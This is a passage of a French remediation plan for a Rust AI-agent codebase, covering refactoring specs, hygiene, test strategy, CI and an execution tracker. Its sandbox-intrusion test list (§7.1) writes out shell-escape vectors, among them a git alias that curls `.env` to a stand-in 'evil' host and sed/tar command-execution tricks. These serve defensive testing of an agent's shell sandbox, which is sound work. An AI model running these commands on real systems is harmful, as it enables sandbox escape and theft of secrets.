4. **History à double représentation** : `canonical: Vec<…>` + `legacy: Vec<(Role, String)>` (`state/history.rs:79-84`), resynchronisées par un parseur de grammaire texte (`normalize_legacy_entries`, history.rs:189-270) ; la compaction passe par `DerefMut` vers legacy (`agent_loop.rs:181, 202`) et détruit le canonique ; un texte d'assistant contenant un bloc tool_call serait réinterprété comme un vrai tool-call à la re-normalisation (la protection existe pour les résultats `history.rs:472-485`, pas pour le texte assistant) ; sémantique mixte du Deref (`len()`/`first()`/`last()` sur canonique, `iter()`/`for` sur legacy — désaccord possible dans `compact_messages`).

**Correction prescrite.**
1. Extraire un module unique d'extraction/exécution des tool-calls (fence + équilibrage d'accolades, JSON multi-ligne, clés de repli unifiées) consommé par l'ACP **et** web2api ; supprimer les 3 implémentations JSON au profit d'une ; IDs de tool-calls générés au seul endroit canonique ; filtrer les balises thinking dans web2api.
2. Supprimer `GeminiFrameEvent` (ou `StreamItem` — garder le type du domaine sémantique) et sa couche de conversion ; la suppression est mécanique une fois SPEC-P0-03 passé (le canal porte déjà le bon type).
3. Réécrire `emitter.rs` avec une macro (ou fonction générique) : ~557 → ~220 lignes attendues ; supprimer `tool_bindings` et `bind_tool_identity` (map identité→identité) ; conserver **une** structure de traçage des ids par tour (proposer `integrity.tools` comme référence, supprimer `seen_tool_ids` et le HashSet local) ; remplacer le trait `TurnEventSink` par un type concret tant qu'il n'a qu'une implémentation (réintroduire le trait le jour d'une 2e impl, décision ADR).
4. History : faire du canonique la **seule** représentation (supprimer `legacy` et `normalize_legacy_entries` en conservation de données, sérialiser le canonique directement dans le store) ; si la compatibilité des stores existants impose la lecture des chaînes, confiner le parsing à l'import initial (migration au chargement, jamais en resynchronisation continue) ; étendre la protection anti-marqueurs-embarqués au texte assistant (miroir de `history.rs:472-485`) ; donner à `Deref`/`DerefMut` une sémantique unique (ou supprimer le Deref au profit de méthodes explicites).
5. Corriger la race de cancellation de `model_projection.rs:41-58` : ajouter le check initial `if *cancel_rx.borrow()` avant `changed().await` (remède déjà documenté dans `cancellation.rs:30-42`).

**Critères d'acceptation.**
- [ ] Un seul extracteur de tool-call JSON dans le workspace ; web2api et ACP partagent la pile sémantique.
- [ ] Un seul type de frame dans le canal ; plus de conversion A→B→A.
- [ ] `emitter.rs` ≤ 250 lignes ; plus de map identité→identité ; une seule structure de traçage d'ids.
- [ ] Test property : un assistant-text contenant un bloc tool_call jsonifié ne génère jamais de faux tool-call après compaction + re-normalisation.
- [ ] 370 tests existants toujours verts (les tests de stress events/ restent la garde-fou).

---

### SPEC-P2-03 — Hygiène : commentaires d'audit, fmt, langue, ressources

- **Priorité** : P2 · **Effort** : 1-1,5 j · **Source audit** : chap. 8.2, 8.5 · **Dépendances** : après P1 (les commentaires mensongers D-17/P-07/D-13 disparaissent avec leurs correctifs)

**Constat.** 56 occurrences de codes C-xx/D-xx/P-xx/M-x/I-x dans 30+ fichiers (`agent_loop.rs:16-29`, `state/mod.rs:79-82`, `stream.rs`, `permission.rs:32-49`, `turn.rs:1-2`, `session.rs:18, 102-104`…), référençant des specs/docs supprimés (« big cleanup ») ; plusieurs décrivent un comportement faux (D-17 annulation, P-07 validation, D-13 ordre). Hygiène de forme : mélange systématique FR/EN (descriptions `file.rs` FR vs `filesystem.rs` EN, messages sandbox FR vs `interactive.rs` EN, system prompt entier en français) ; métadonnées hardcodées « claudeCode » (`executor/permission.rs:249-256`) ; `MCP_PROTOCOL_VERSION « 2026-07-28 »` sans révision publiée correspondante ; User-Agent figé Chrome 126 ; web_search figé « 0.2 » (workspace en 0.2.2) ; valeurs magiques sans commentaire (`payload.rs:107-110` 102 slots, `"created": 1_700_000_000`) ; rustfmt non passé (`filesystem.rs:210` « }fn format_paths », `bin/main.rs`) ; README d'une ligne pour acp-adaptor ; typo de test `sanitize_title_collabse_et_tronque`.

**Correction prescrite.**
1. Créer `CHANGELOG.md` ; y déplacer la substance utile des commentaires d'audit (un paragraphe « consolidation post-audit ») ; supprimer les 56 commentaires du code ; remplacer ceux qui portent un invariant réel par une description du comportement courant.
2. `cargo fmt` sur tout le workspace + `fmt --check` en CI (SPEC §8).
3. Unifier la langue en anglais : descriptions d'outils, messages d'erreur sandbox, textes interactifs, placeholder d'image (`[image attached — describe its content]`), et **externaliser le system prompt** (`build.rs:101-165`, ~60 lignes) vers `resources/system_prompt.md` chargé à la compilation (include_str!) — les tests qui figent des phrases exactes sont mis à jour avec le texte anglais (attention : changement de prompt = changement de comportement modèle, cf. §11 risques).
4. Corriger les constantes : métadonnées ACP (« claudeCode » → nom du produit réel ou valeur configurable), `MCP_PROTOCOL_VERSION` (aligner sur une révision publiée réelle, ou « dynamic » si négocié), User-Agent (mise à jour Chrome récente + champ version dérivé de `env!("CARGO_PKG_VERSION")`), web_search version.
5. Documenter les valeurs magiques (constantes nommées + une ligne de justification : 102 slots, epoch 1_700_000_000, accumulateur 64 Ko `stream.rs:127-130` — et évaluer l'élévation du plafond, cf. SPEC-P2-05).
6. Compléter le README d'acp-adaptor (rôle du crate, handlers, configuration) ; corriger la typo du test ; corriger le littéral `{{...}}` oublié de `convert/openai.rs:9` (le modèle reçoit deux accolades au lieu d'une).

**Critères d'acceptation.**
- [ ] `rg -E 'C-[0-9]+|D-[0-9]+|P-[0-9]+|I-[0-9]+' crates/ --type rust` → 0 occurrence.
- [ ] `cargo fmt --check` vert.
- [ ] Plus aucune chaîne française dans les sources non-test (grep des accents sur `crates/*/src` hors commentaires d'exemples) ; system prompt en ressource externe.
- [ ] CHANGELOG.md créé avec les entrées P0/P1/P2.

---

### SPEC-P2-04 — Conventions, nommage et ordre des modules

- **Priorité** : P2 · **Effort** : 1-1,5 j · **Source audit** : chap. 9.3 · **Dépendances** : après SPEC-P2-01/P2-02 (éviter de déplacer du code condamné)

**Constat.** Incohérences de convention et de nommage : `mcp.rs` + dossier `mcp/` (idiome 2018) contre `mod.rs` partout ailleurs ; tests répartis entre `src/test/` via `#[path]`, modules inline et dossier `tests/` (deux, voire trois conventions) ; homonymes trompeurs — trois `ToolResult`, deux `BlockKind` (sémantiques différentes), deux `resolve_path` (UI sans sécurité `tool_ux/results.rs:185-188` vs sécurisée `builtin/file.rs:21-24`), `action_typed.rs` monté en module `action` via `#[path]` (nom trompeur, hack inutile), `turn_sid` qui contient un id de session (`handler.rs:19, 53`). Fragmentations injustifiées : six fichiers « turn* » pour trois responsabilités réelles (`turn.rs`, `turn_execution.rs` — 20 l., `error.rs` — 13 l. peuvent fusionner ; la séparation TurnManager/TurnService est justifiée) ; `turn_context.rs` (16 l.) et `content.rs` (34 l.) en micro-fichiers ; `core/` de llm-provider en fourre-tout (shim time, tool_prompt mal placé). Duplication de handlers : `handle_load`/`handle_resume` et `handle_delete`/`handle_close` quasi verbatim.

**Correction prescrite.**
1. Module idiom unique : `mod.rs` partout (convertir `mcp.rs` + `mcp/` → `mcp/mod.rs` + sous-modules), ou documenter l'exception — recommandé : conversion.
2. Convention de tests unique, déclarée dans un `CONTRIBUTING.md` court : tests unitaires inline (`#[cfg(test)]`) + intégration dans `tests/` ; convertir `src/test/` (via `#[path]`) vers l'inline ; une seule convention, zéro exception nouvelle.
3. Renommer : `action_typed.rs` → module `action` réel (supprimer le `#[path]`) ; `turn_sid` → `session_id` ; les deux `resolve_path` → `display_path` (UI) vs `resolve_path` (sécurisé) ; désambiguïser les trois `ToolResult` (noms qualifiés par module : `ToolCallResult`/`McpToolResult`/`AcpToolResult` selon les cas réels) et les deux `BlockKind` (`RawBlockKind` vs `SemanticBlockKind`).
4. Fusionner les micro-fichiers : `turn_execution.rs` + `error.rs` dans `turn.rs` (ou dans `execution/mod.rs`) ; `turn_context.rs` et `content.rs` absorbés par leur consommateur ; vider `core/` des éléments mal placés (`tool_prompt` → consommateur unique ou suppression, cf. P2-01).
5. Dédupliquer les handlers de session par paramétrisation (fonction générique sur l'opération + différences explicites) : `handle_load`/`handle_resume`, `handle_delete`/`handle_close`.
6. Remplacer la garde d'architecture par grep de chaînes (`tests/tool_ux_architecture.rs`, qui interdit « Terminal » avec majuscule alors que « terminal » minuscule existe dans `display.rs:117`) par des contraintes de compilation (visibilité minimale, modules privés) ou la supprimer.

**Critères d'acceptation.**
- [ ] Un seul idiome de modules et une seule convention de tests ; `CONTRIBUTING.md` présent.
- [ ] Plus aucun `#[path]` dans le workspace.
- [ ] Les homonymes listés sont renommés ; `rg 'resolve_path' crates/` retourne une seule définition par nom.
- [ ] Handlers de session dédupliqués (diff-coverage : les tests existants passent sans modification sémantique).

---

### SPEC-P2-05 — Optimisations ciblées et durcissement web2api

- **Priorité** : P2 · **Effort** : 1,5-2 j · **Source audit** : chap. 4 (mineurs), 5.4, 6.1, 7 (mineurs) · **Dépendances** : profit de P2-01 (snapshot supprimé = double sérialisation supprimée) et P1-04 (cancellation)

**Constat et corrections prescrites.**

1. **Double sérialisation à chaque `end_turn`** (`persistence.rs` : persist complet, puis `to_vec_pretty` pour le snapshot) : résolue par la suppression du snapshot (SPEC-P2-01). Vérifier la mesure avant/après (temps `end_turn` sur store volumineux).
2. **Accumulateur brut plafonné à 64 Ko** (`stream.rs:127-130`) : au-delà, seules la tête du flux est scannée — le plafond protège la mémoire mais rend les détections muettes sur les longues réponses ; à traiter après SPEC-P1-06 (détection sur frames décodées) : le plafond devient inutile pour la détection, ne conserver qu'une borne mémoire saine documentée.
3. **Compaction qui évince le message utilisateur initial** (`agent_loop.rs:551-563`, évince par taille décroissante) : protéger explicitement le premier message utilisateur (et le dernier tour), évincer ensuite par taille.
4. **Heuristique `is_context_error` par sous-chaînes** (`agent_loop.rs:524-527`, « context », « too long », « tokens ») : remplacer par un variant typé `ContextOverflow` produit par le provider (le canal typé de SPEC-P0-03 le permet) ; l'heuristique reste en repli mais le typé prime.
5. **Boucle d'upload insensible à la cancellation** (`acp-adaptor/prompt/turn/uploads.rs:30-50`) : `tokio::select!` avec le token de cancellation (aligné SPEC-P1-04).
6. **Simulation de tokens** (`notify.rs:13-18`, `chars/4` avec `CONTEXT_TOKENS = 1_000_000` hardcodé, en reconstruisant le prompt complet juste pour compter) : calculer le comptage incrémentalement lors de la construction du prompt ; exposer la constante de contexte depuis la config du modèle.
7. **ToolCall persisté sans ToolResult rejoué « running » à vie** (`handlers/session.rs:115-119`) : normaliser au chargement — tout tool-call sans résultat est rejoué en statut « failed/cancelled » avec un marqueur explicite.
8. **Placeholder d'image persisté comme message utilisateur** (remplace l'image réelle au replay) : persister la référence d'upload (ou l'erreur) et projeter le placeholder uniquement à l'affichage.
9. **Durcissement web2api** : clé d'API acceptée en paramètre de requête avec CORS ouvert (`http.rs:86-119`) — passer l'authentification en header (`Authorization: Bearer`), restreindre CORS aux origines configurées (défaut : local) ; comparaison en temps constant réécrite à la main avec boucle factice (`http.rs:20-39`) — utiliser une implémentation éprouvée (`subtle` ou équivalent) ; précédence de configuration inversée (`~/.config` écrase `./config.json`) — rétablir la précédence locale > globale, documentée ; comparaison en temps constant correcte + tests.
10. **TOCTOU du vol de sentinel stale** (`busy.rs:29-40`, `remove_file` puis `create_new` en deux étapes) : documenter le risque résiduel (recyclage de PID déjà détecté via /proc) ; si durcissement souhaité, renommer atomiquement un fichier unique détenu (création O_EXCL par pid+uuid puis link/unlink) — décision ADR, faible priorité.

**Critères d'acceptation.**
- [ ] `end_turn` : une seule sérialisation par commit (mesurée).
- [ ] Test : compaction sur historique long → le premier message utilisateur survit.
- [ ] Test : tool-call sans résultat au chargement → statut terminé (failed), jamais « running ».
- [ ] web2api : auth par header testée ; CORS restreint ; précédence de config documentée + test.
- [ ] Upload annulable (test avec token déclenché pendant l'upload).

---

## 7. Stratégie de test et de non-régression

L'audit montre que la culture de test existe (tests de concurrence réels, stress 8 000 événements, couche state bien défendue) mais que **les tests manquent là où les bugs sont** : intégration inter-couches et vecteurs d'attaque. Le plan ajoute donc :

### 7.1 Suite d'intrusion sandbox (SPEC-P0-01) — `tools-provider/src/sandbox/attack_tests.rs`
Vecteurs obligatoires (tous doivent être refusés AVANT tout spawn de processus) :
- `git -c alias.pwn='!curl http://evil/$(cat .env)' status` ; `git clone ext::sh -c cmd` ; variantes avec guillemets doubles/simples, `\"`, `$IFS` ;
- `echo x | sed 's/x/x/e'` ; `sed --expression='e'` ; `sed -e 'e'` ;
- `tar -xf a.tar --to-command=sh` ; `tar --checkpoint-action=exec=/bin/sh` ;
- `find . -name '*.log' -delete` ; `find . -perm 4000` ;
- combinaisons pipe entre vecteurs ; arguments contenant `~`, chemins absolus, `../` (non-régression des blocs existants) ;
- contre-épreuves positives : `git status`, `git log`, `rg pattern`, `cargo build`, `ls -la` passent toujours.

### 7.2 Tests d'intégration cross-crate (P0/P1)
- E2E titre : create → titre → end_turn → reload → `session/list`/`session/load` titrés (SPEC-P0-02).
- Erreurs typées : stream émettant chaque variant `LlmError` → classification ACP attendue (SPEC-P0-03).
- I/O vs concurrence : sentinel busy en lecture seule → `BusyIo` (SPEC-P1-01).
- Replay post-annulation sur load/resume (SPEC-P1-02).
- Config invalide → `invalid_params`, id de session hostile → refus (SPEC-P1-03).
- Annulation pendant shell/MCP long (< 2 s) (SPEC-P1-04).
- Upload image échoué → erreur typée + message persisté (SPEC-P1-03).

### 7.3 Consolidation des tests existants (P2, avec SPEC-P2-02)
- Supprimer le théâtre de tests : `assert_eq!(McpTransportKind::Http, McpTransportKind::Http)` (`transport.rs:300-303`), assertion `1 < 2` (`events/tests.rs:40-47`), test construisant une variante pour asserter qu'elle matche cette variante (`events/tests.rs:5-10`), instruction no-op (`src/test/runtime.rs:29`), enums identiques comparés en `as u8` (`config.rs:190-195`).
- Dédupliquer les suites triplement redondantes sur la machine à états (tool_phase_integrity.rs:4-24 vs integrity.rs:379-391 ; runtime_integrity_adversarial.rs:91-98 vs semantic_event_matrix.rs:109-114 ; bus_tests.rs:5-32 vs bus.rs:130-195) : garder une copie par niveau (unitaire OU intégration), pas les deux.
- Cible : le volume de tests peut baisser en lignes tout en montant en valeur ; ne jamais supprimer un test sans le remplacer par une assertion équivalente ailleurs.

## 8. Intégration continue et outillage

L'historique montre que les workflows GitHub et le devcontainer ont été supprimés (`78ae2bb`). À rétablir dans une forme minimale et stricte (SPEC-CI, effort 0,5-1 j, à programmer dès la fin des P0) :

- **Gate unique par PR** : `cargo fmt --check` → `cargo clippy --workspace --all-targets -- -D warnings` → `cargo test --workspace` → `cargo check --workspace --all-targets`. Échec = merge bloqué.
- **Détection de code mort** : `cargo +nightly udeps` (déps) et revue manuelle guidée par `#[cfg_attr(test, allow(...))]` interdits ; `cargo machete` en advisory.
- **Empêcher le retour du slop** : check de CI interdisant les codes d'audit (même grep que SPEC-P2-03) et les chaînes françaises dans `crates/*/src` (liste d'exclusions documentée).
- **CHANGELOG.md** alimenté par chaque PR (règle DoD) ; tags de version sur les jalons.

## 9. Ordonnancement, dépendances et jalons

```
P0-01 sandbox ──────► P1-05 executor+risque ──► P2-01 purge mort
P0-02 titre ─────────────────────────────────► (indépendant)
P0-03 canal typé ──► P1-06 wire-level ───────► P2-02 unifications
P1-01 BusyIo (indépendant)
P1-02 ordre load/resume (indépendant)
P1-03 config+ids+upload (indépendant)
P1-04 cancellation (après décision P1-05)
P2-03 hygiène (après P1)
P2-04 conventions (après P2-01/P2-02)
P2-05 optimisations (profit P2-01, P1-04)
SPEC-CI (dès fin P0)
```

| Jalon | Contenu | Critère de sortie | Version suggérée |
|---|---|---|---|
| **A — Sécurité** (S1) | P0-01, P0-02, P0-03, SPEC-CI | Suite d'intrusion verte ; titre persisté (test E2E) ; canal typé | 0.2.3 |
| **B — Consolidation** (S2-S3) | P1-01 → P1-06 | Tous les critères P1 cochés ; zéro double chemin ; zéro faux diagnostic | 0.3.0 |
| **C — Nettoyage** (S4) | P2-01 → P2-05 | ~750 lignes mortes purgées ; 0 commentaire d'audit ; fmt+langue unifiées ; unifications vertes | 0.4.0 |

Effort total estimé : **17-24 jours-homme** (~4 semaines). Parallélisation : P1-01/P1-02/P1-03 sont indépendants et peuvent avancer en parallèle des P0 ; P2-02 est le poste le plus long (2-3 j) et bénéficie d'une relecture dédiée.

## 10. Suivi d'exécution

| ID | Titre | Priorité | Effort | Dépendances | Statut |
|---|---|---|---|---|---|
| SPEC-P0-01 | Sécuriser la sandbox shell | P0 | 1,5-2 j | — | done (v0.3.0 : blocage `!`/`ext::`/`git -c`/sed/tar/find, `ShellSandbox::classify` entrée unique, liste High complétée git/gh/sed/find/tar/zip/unzip + exception git lecture seule documentée, messages honnêtes, ADR 0001, `sandbox/attack_tests.rs` — 10 tests) |
| SPEC-P0-02 | Persister le titre de session | P0 | 0,5 j | — | done (v0.3.0 : écriture via `Store::update_session` à la dérivation, invariant documenté dans `end_turn`, tests store : reload + fork + sans-titre) |
| SPEC-P0-03 | Taxonomie d'erreurs sur le canal | P0 | 1-1,5 j | — | done (v0.3.0 : `StreamResult = Result<StreamItem, LlmError>`, `map_gemini_error` déplacé dans `core::errors` point unique, CookiesExpired → authentication, tests de classification par variant) |
| SPEC-P1-01 | BusyIo vs AlreadyRunning | P1 | 0,5 j | — | done (v0.3.0 : `acquire_busy` typé Busy/Io, `TurnError::BusyIo` projeté `internal_error`, tests I/O (nom trop long) et concurrence) |
| SPEC-P1-02 | Ordre load/resume | P1 | 0,5 j | — | done (v0.3.0 : `cancel_and_wait` avant lecture snapshot dans load et resume, D-13 purgé, test d'intégration replay post-annulation via TurnManager) |
| SPEC-P1-03 | Config honnête + ids + upload | P1 | 1 j | — | done (v0.3.0 : `validate_config_change`/`apply_config_change` — 4 valeurs invalides → `invalid_params` EN sans mutation, garde `is_valid_session_id` dans config.rs, P-07 corrigé, `ImageUploadError` typée + message utilisateur poussé avant `end_turn`, plus aucun `StopReason::Refusal`) |
| SPEC-P1-04 | Cancellation outils + allow_always | P1 | 1-2 j | P1-05 (décision) | done (v0.3.0 : cancellation propagée au trait `Tool` et à `registry.call_async`, shell kill du process group < 2 s, MCP select! + corrélation par id côté stdio, D-17 purgé, `Session.permission_rules` (tool, kind, allow) mémorisées en session — jamais cross-session, fork sans héritage, tests shell/MCP < 2 s) |
| SPEC-P1-05 | Executor mort + risque unifié | P1 | 1,5-2 j | P0-01 | done (v0.3.0 : `terminal.rs` + machine à états lifecycle supprimés, politique de permission unique côté acp-adaptor, repli heuristique `ShellAnalysis::analyze` supprimé, `checked_add` théâtral remplacé par `max_tool_calls_per_turn` = 128 + `ToolCallBudgetExhausted`, grep d'acceptation vide) |
| SPEC-P1-06 | Wire-level + erreurs web2api | P1 | 1-2 j | P0-03 | done (v0.3.0 : `bard_error` sur métadonnées décodées uniquement — le texte des candidates n'est plus scanné, scan de phrases de refus sur flux brut supprimé, upload image → 502, SSE erreur → chunk `error`/finish_reason `error` jamais `stop`, tool_call retiré seulement si parsé, extraction multi-lignes par équilibrage d'accolades) |
| SPEC-P2-01 | Purge code mort (~750 l.) | P2 | 1 j | P1-05 | todo (statut « done » antérieur sans correspondance dans le dépôt ; le chemin executor/lifecycle mort a été supprimé par P1-04/P1-05 en amont — la purge large reste à faire) |
| SPEC-P2-02 | Unifications structurelles | P2 | 2-3 j | P0-03, P1-06 | todo |
| SPEC-P2-03 | Hygiène (commentaires, fmt, langue) | P2 | 1-1,5 j | P1 | todo (fmt et clippy -D warnings verts dès v0.3.0 ; 56 commentaires d'audit C-xx/D-xx et traduction FR→EN restants) |
| SPEC-P2-04 | Conventions et nommage | P2 | 1-1,5 j | P2-01, P2-02 | todo |
| SPEC-P2-05 | Optimisations + durcissement web2api | P2 | 1,5-2 j | P2-01, P1-04 | todo (la décision de confinement est tracée dans `docs/adr/0001-sandbox-execution.md`) |
| SPEC-CI | Pipeline GitHub Actions | — | 0,5-1 j | P0 | todo |

**Bilan d'exécution v0.3.0 (validation : `cargo check --workspace --all-targets` OK, `cargo clippy --workspace --all-targets -- -D warnings` zéro warning, `cargo fmt --check` OK, 393 tests verts dont 23 nouveaux — attack_tests, classification du canal, titre store, BusyIo, config handler, permissions, cancellation shell/MCP, replay post-annulation, parsing tool-calls).** Les trois P0 et les six P1 sont intégralement livrés avec leurs tests d'acceptation, un commit par item, un CHANGELOG par item, version bumped 0.2.2 → 0.3.0 conformément au jalon A+B. Deux écarts assumés et documentés : (1) §7.1 — `cargo build` reste refusé par la sandbox (les build scripts exécutent du code arbitraire ; l'« contre-épreuve positive » du spec initial est corrigée) et `find -perm 4000` reste autorisé (lecture pure, contrôle positif documenté dans l'ADR 0001) ; (2) la suppression du chemin executor/lifecycle mort (P1-05) a emporté les tests unitaires de cette machine inatteignable — l'intégrité terminale des tool-calls reste garantie par `agent-runtime::events::integrity` (ToolPhase), code vivant. Phase P2 et SPEC-CI : intégralement à programmer.

## 11. Registre des risques du plan

| Risque | Impact | Mitigation |
|---|---|---|
| Durcissement sandbox = faux positifs bloquant des usages légitimes | Frustration utilisateur | Contre-épreuves positives obligatoires (§7.1) ; échappatoire documentée (mode de permission explicite), jamais de désactivation silencieuse |
| Reclassement High de `git` change l'UX AcceptEdits | Plus de demandes de permission | Exception explicite documentée pour les sous-commandes git sûres après filtrage `-c`/`alias` (déjà bloqué en P0) |
| Canal typé (P0-03) : migration touche de nombreux call-sites | Régression temporaire | Un PR unique, exhaustivité guidée par le compilateur, tests de classification par variant |
| Suppression du chemin executor/terminal | Perte d'une voie d'isolation future | Décision tracée en ADR ; réintroduction planifiée (SPEC-P0-01 point 5) plutôt que conservation morte |
| Unification du parsing tool-calls | Changement de comportement web2api | Golden tests de conversion avant/après ; les divergences actuelles sont elles-mêmes des bugs latents (audit M4) |
| History canonique unique | Compatibilité des stores existants | Migration au chargement confinée ; tests sur stores réels de la 0.2.2 |
| System prompt FR→EN | Changement de comportement modèle | Rejouer les tests figés ; faire la bascule dans le jalon C, isolée, réversible par ressource |
| Suppression du sous-système snapshot | Utilisateurs ayant des fichiers .snap.json | Aucun lecteur n'a jamais existé (vérifié) ; note CHANGELOG ; aucune donnée session perdue (le store principal est indépendant) |
| Rythme IA à l'origine du slop : le nettoyage pourrait reproduire le pattern | Nouveau slop | Règle anti-régression (§3) + gate CI + PRs unitaires revues ; un item = un PR |

## 12. Critères de succès globaux

1. **Sécurité** : la suite d'intrusion sandbox (§7.1) est verte et archivée dans le dépôt ; aucun vecteur de contournement connu ne passe ; la classification de risque n'a qu'un seul point de vérité.
2. **Honnêteté des diagnostics** : plus aucune erreur réelle masquée (I/O, SSE, upload) derrière un succès ou un faux diagnostic ; le canal de streaming est typé de bout en bout.
3. **Bugs visibles corrigés** : le titre survit à un redémarrage ; `session/load`/`resume` rejouent l'état post-annulation ; la configuration illégale est rejetée.
4. **Hygiène mesurable** : ~750 lignes mortes supprimées (vérifiable par diff), 0 commentaire d'audit résiduel, `cargo fmt --check` et clippy `-D warnings` verts en CI.
5. **Unicité** : une pile de parsing tool-calls, un type de frame, un classificateur de risque, une politique de permission, une convention de tests, un idiome de modules, une langue.
6. **Non-régression** : les 370 tests existants restent verts à chaque étape ; chaque item ajoute ses tests d'acceptation ; les tests de stress events/ (8 000 événements) restent le garde-fou des unifications.
